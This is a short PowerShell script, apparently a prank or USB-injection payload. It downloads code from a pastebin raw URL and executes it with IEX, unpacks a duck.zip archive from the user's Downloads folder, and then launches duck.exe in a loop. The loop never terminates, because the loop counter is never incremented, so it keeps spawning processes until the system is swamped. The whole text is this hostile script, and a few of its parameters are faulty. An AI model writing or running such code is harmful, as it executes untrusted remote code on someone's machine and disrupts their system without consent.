IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/FWWk5dCE') -Force
Expand-Archive -Path "$env:USERPROFILE/Downloads/duck.zip" -DestinationPath "$env:USERPROFILE/Downloads/duck" -Force
$laps = 0

while ($laps -lt 10) {
    $counter++
Start-Process Downloads\duck\duck\duck.exe -Force
}


